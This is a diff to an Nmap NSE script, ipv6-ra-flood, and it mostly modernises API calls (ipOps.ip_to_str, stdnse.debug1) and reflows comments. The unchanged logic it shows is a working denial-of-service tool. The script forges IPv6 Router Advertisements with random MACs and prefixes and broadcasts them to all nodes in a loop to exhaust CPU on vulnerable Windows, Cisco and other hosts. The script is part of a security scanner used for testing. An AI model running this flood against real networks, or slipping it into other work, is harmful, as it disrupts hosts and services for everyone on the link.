@@ -1,3 +1,4 @@
+local ipOps = require "ipOps"
 local nmap = require "nmap"
 local packet = require "packet"
 local stdnse = require "stdnse"
@@ -5,8 +6,13 @@ local math = require "math"
 local string = require "string"
 local os = require "os"
 
-description = [[ Generates a flood of Router Advertisements (RA) with random source MAC addresses and IPv6 prefixes. Computers, which have stateless autoconfiguration enabled by default (every major OS),
-will start to compute IPv6 suffix and update their routing table to reflect the accepted announcement. This will cause 100% CPU usage on Windows and platforms, preventing to process other application requests.
+description = [[
+Generates a flood of Router Advertisements (RA) with random source MAC
+addresses and IPv6 prefixes. Computers, which have stateless autoconfiguration
+enabled by default (every major OS), will start to compute IPv6 suffix and
+update their routing table to reflect the accepted announcement. This will
+cause 100% CPU usage on Windows and platforms, preventing to process other
+application requests.
 
 Vulnerable platforms:
 * All Cisco IOS ASA with firmware < November 2010
@@ -18,16 +24,17 @@ Vulnerable platforms:
 
 Security advisory: http://www.mh-sec.de/downloads/mh-RA_flooding_CVE-2010-multiple.txt
 
-WARNING: This script is dangerous and is very likely to bring down a server or network appliance.
-It should not be run in a production environment unless you (and, more importantly,
-the business) understand the risks!
+WARNING: This script is dangerous and is very likely to bring down a server or
+network appliance.  It should not be run in a production environment unless you
+(and, more importantly, the business) understand the risks!
 
 Additional documents: https://tools.ietf.org/rfc/rfc6104.txt
 ]]
 
 ---
 -- @args ipv6-ra-flood.interface defines interface we should broadcast on
--- @args ipv6-ra-flood.timeout runs the script until the timeout is reached (default: 30s). If timeout is zero, the script will run forever.
+-- @args ipv6-ra-flood.timeout runs the script until the timeout is reached
+--       (default: 30s). If timeout is zero, the script will run forever.
 --
 -- @usage
 -- nmap -6 --script ipv6-ra-flood.nse
@@ -35,7 +42,7 @@ Additional documents: https://tools.ietf.org/rfc/rfc6104.txt
 -- nmap -6 --script ipv6-ra-flood.nse --script-args 'interface=<interface>,timeout=10s'
 
 author = "Adam Števko"
-license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"dos", "intrusive"}
 
 try = nmap.new_try()
@@ -44,17 +51,17 @@ math.randomseed(os.time())
 
 prerule = function()
   if nmap.address_family() ~= "inet6" then
-    stdnse.print_debug("%s is IPv6 compatible only.", SCRIPT_NAME)
+    stdnse.debug1("is IPv6 compatible only.")
     return false
   end
 
   if not nmap.is_privileged() then
-    stdnse.print_debug("Running %s needs root privileges.", SCRIPT_NAME)
+    stdnse.debug1("Running %s needs root privileges.", SCRIPT_NAME)
     return false
   end
 
   if not stdnse.get_script_args(SCRIPT_NAME .. ".interface") and not nmap.get_interface() then
-    stdnse.print_debug("No interface was selected, aborting...", SCRIPT_NAME)
+    stdnse.debug1("No interface was selected, aborting...")
     return false
   end
 
@@ -66,10 +73,10 @@ local function get_interface()
 
   local if_table = nmap.get_interface_info(arg_interface)
 
-  if if_table and packet.ip6tobin(if_table.address) and if_table.link == "ethernet" then
+  if if_table and ipOps.ip_to_str(if_table.address) and if_table.link == "ethernet" then
     return if_table.device
   else
-    stdnse.print_debug("Interface %s not supported or not properly configured, exiting...", arg_interface)
+    stdnse.debug1("Interface %s not supported or not properly configured, exiting...", arg_interface)
   end
 end
 
@@ -105,13 +112,13 @@ local function build_router_advert(mac_src,prefix,prefix_len,valid_time,preferre
   0x00,0x00,0x00,0x00, --reachable time
   0x00,0x00,0x00,0x00) --retrans timer
 
-  local mtu_option_msg = string.char(0x00, 0x00) .. -- reserved
+  local mtu_option_msg = "\0\0" .. -- reserved
   packet.numtostr32(mtu) -- MTU
 
   local prefix_option_msg = string.char(prefix_len, 0xc0) .. --flags: Onlink, Auto
   packet.set_u32("....", 0, valid_time) .. -- valid lifetime
   packet.set_u32("....", 0, preferred_time) .. -- preferred lifetime
-  string.char(0,0,0,0) .. --unknown
+  "\0\0\0\0" .. --unknown
   prefix
 
   local icmpv6_mtu_option = packet.Packet:set_icmpv6_option(packet.ND_OPT_MTU, mtu_option_msg)
@@ -126,7 +133,7 @@ end
 --- Broadcasting on the selected interface
 -- @param iface table containing interface information
 local function broadcast_on_interface(iface)
-  stdnse.print_verbose("Starting " .. SCRIPT_NAME .. " on interface " .. iface)
+  stdnse.verbose1("Starting on interface " .. iface)
 
   -- packet counter
   local counter = 0
@@ -139,7 +146,7 @@ local function broadcast_on_interface(iface)
   try(dnet:ethernet_open(iface))
 
   local dst_mac = packet.mactobin("33:33:00:00:00:01")
-  local dst_ip6_addr = packet.ip6tobin("ff02::1")
+  local dst_ip6_addr = ipOps.ip_to_str("ff02::1")
 
   local prefix_len = 64
 
@@ -156,7 +163,7 @@ local function broadcast_on_interface(iface)
     local src_mac = packet.mactobin(random_mac())
     local src_ip6_addr = packet.mac_to_lladdr(src_mac)
 
-    local prefix = packet.ip6tobin(get_random_prefix())
+    local prefix = ipOps.ip_to_str(get_random_prefix())
 
     local packet = packet.Frame:new()
 
@@ -181,7 +188,7 @@ local function broadcast_on_interface(iface)
   end
 
   if counter > 0 then
-    stdnse.print_debug("%s generated %d packets in %d seconds.", SCRIPT_NAME, counter, stop - start)
+    stdnse.debug1("generated %d packets in %d seconds.", counter, stop - start)
   end
 end
 
